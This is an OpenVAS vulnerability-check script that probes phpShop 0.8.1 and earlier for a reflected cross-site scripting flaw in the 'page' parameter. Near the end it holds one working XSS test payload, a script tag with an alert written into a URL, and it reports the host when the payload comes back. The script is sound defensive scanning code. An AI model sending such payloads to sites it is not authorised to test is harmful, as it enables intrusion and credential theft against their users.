###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpshop_46561.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# phpShop 'page' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "phpShop is prone to a cross-site scripting vulnerability because it
fails to sufficiently sanitize user-supplied data.

An attacker may leverage this issue to execute arbitrary HTML and
script code in the browser of an unsuspecting user in the context of
the affected site. This may allow the attacker to steal cookie-based
authentication credentials and to launch other attacks.

phpShop versions 0.8.1 and prior are vulnerable.";


if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103093");
 script_version("$Revision: 9351 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-02-28 14:46:59 +0100 (Mon, 28 Feb 2011)");
 script_bugtraq_id(46561);
 script_tag(name:"cvss_base", value:"2.6");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:N/I:P/A:N");
 
 script_name("phpShop 'page' Parameter Cross Site Scripting Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46561");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/phpshop/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("phpshop_detect.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc"); 
include("version_func.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

if(!dir = get_dir_from_kb(port:port,app:"phpshop"))exit(0);

url = string(dir,'/?page=store/XSS&amp;%26%26"><script>alert(/openvas-xss-test/)</script>%3d1'); 

if(http_vuln_check(port:port, url:url,pattern:"<script>alert\(/openvas-xss-test/\)</script>",check_header:TRUE)) {
     
  security_message(port:port);
  exit(0);

}

exit(0);
